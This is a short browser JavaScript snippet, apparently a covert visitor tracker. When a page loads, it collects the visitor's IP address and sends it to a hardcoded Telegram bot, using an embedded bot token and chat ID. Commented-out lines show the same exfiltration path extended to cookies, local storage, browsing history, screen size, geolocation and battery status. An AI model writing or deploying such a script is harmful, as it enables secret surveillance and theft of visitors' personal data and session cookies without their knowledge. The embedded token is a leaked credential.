let info = new Userinfo();
const token = "1486167780:AAHXNWYm1McfP9eUxbYlIbUZXpdcJeC8qGg";
const tgid = "642425664"

function sendMessage(text) {
	let url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + tgid + '&text=' + text;
	let xhttp = new XMLHttpRequest();

	xhttp.open("GET", url, true);
	xhttp.send();
}


async function getInfo() {
    //sendMessage(info.pageon());
    //sendMessage(info.referrer());
    //sendMessage(info.previousSites());
    //sendMessage(info.browserInfo());
    //sendMessage(info.dataCookies());
    //sendMessage(info.dataStorage());
    //sendMessage(info.sizeScreen());
    //sendMessage(await info.position());
    //sendMessage(await info.battery());
    ipobject = (await info.ip());
    sendMessage('IP адрес: ' + ipobject.ipAddress)
}

getInfo();